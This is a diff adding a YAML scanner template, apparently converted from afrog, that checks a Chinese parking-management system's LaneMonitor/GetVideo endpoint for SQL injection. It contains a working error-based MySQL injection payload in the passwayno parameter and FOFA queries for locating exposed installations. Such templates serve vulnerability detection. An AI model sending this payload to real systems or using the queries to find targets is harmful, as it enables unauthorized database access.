@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - qbzx
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%280x71627a7871%2C%28SELECT+%28ELT%283079%3D3079%2C1%29%29%29%2C0x7176786b71%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj'
+id: lanemonitor-getvideo-sqli
+info:
+  author: 熊猫也是猫
+  description: |-
+    fofa: title="智能停车管理系统" || body="/Login/GetAccounts"
+    fofa: icon_hash="938984120"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 停车场后台管理系统GetVideo存在SQL注入漏洞
+  severity: high
+  tags: lanemonitor,sqli,argus-import
